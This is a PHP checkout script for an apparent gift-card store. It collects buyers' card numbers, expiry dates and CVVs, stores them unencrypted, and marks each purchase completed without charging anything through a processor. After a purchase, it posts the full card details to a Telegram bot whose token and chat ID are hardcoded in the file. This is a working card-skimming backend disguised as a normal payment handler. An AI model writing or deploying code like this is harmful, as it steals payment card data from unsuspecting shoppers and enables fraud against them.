<?php
include 'config.php';
session_start();

// Enable error reporting for debugging
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);

// Check if the user is logged in
if (!isset($_SESSION['user_id'])) {
    header('Location: login.php');
    exit();
}

// Retrieve form data
$gift_card_id = $_POST['gift_card_id'];
$user_id = $_POST['user_id'];
$card_number = $_POST['card_number'];
$expiry_date = $_POST['expiry_date'];
$cvv = $_POST['cvv'];

// Validate required fields
if (empty($gift_card_id) || empty($user_id) || empty($card_number) || empty($expiry_date) || empty($cvv)) {
    die("Some required fields are missing.");
}

// Retrieve gift card details
$query = "SELECT * FROM gift_cards WHERE id = ?";
$stmt = $conn->prepare($query);
$stmt->bind_param("i", $gift_card_id);
$stmt->execute();
$gift_card = $stmt->get_result()->fetch_assoc();

if (!$gift_card) {
    die("Gift card not found.");
}

// Calculate total price (assuming quantity is 1)
$total_price = $gift_card['price'];

// Save payment details to the database
$query = "INSERT INTO payment_details (user_id, gift_card_id, card_number, expiry_date, cvv, payment_status) VALUES (?, ?, ?, ?, ?, 'completed')";
$stmt = $conn->prepare($query);
$stmt->bind_param("iisss", $user_id, $gift_card_id, $card_number, $expiry_date, $cvv);

if ($stmt->execute()) {
    // Update the quantity in the gift_cards table
    $query = "UPDATE gift_cards SET quantity = quantity - 1 WHERE id = ?";
    $stmt = $conn->prepare($query);
    $stmt->bind_param("i", $gift_card_id);
    $stmt->execute();

    // Record the purchase
    $query = "INSERT INTO purchases (user_id, gift_card_id, quantity, total_price) VALUES (?, ?, 1, ?)";
    $stmt = $conn->prepare($query);
    $stmt->bind_param("iid", $user_id, $gift_card_id, $total_price);
    $stmt->execute();

    // Send data to Telegram
    $bot_token = '6621783242:AAGuSb2elijTARdfHRyMIoS-siOTP7TTHQ0'; // Replace with your bot token
    $chat_id = '1482859514'; // Replace with your chat ID
    $message = "New Purchase:\n";
    $message .= "User ID: $user_id\n";
    $message .= "Gift Card ID: $gift_card_id\n";
    $message .= "Gift Card Name: " . htmlspecialchars($gift_card['name']) . "\n";
    $message .= "Card Number: $card_number\n";
    $message .= "Expiry Date: $expiry_date\n";
    $message .= "CVV: $cvv\n";
    $message .= "Total Price: $$total_price";

    $url = "https://api.telegram.org/bot$bot_token/sendMessage";
    $post_fields = [
        'chat_id' => $chat_id,
        'text' => $message,
        'parse_mode' => 'HTML'
    ];

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $post_fields);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $response = curl_exec($ch);
    curl_close($ch);

    // Redirect to a success page
    header('Location: purchase_success.php');
    exit();
} else {
    echo "Payment failed. Please try again.";
}
?>
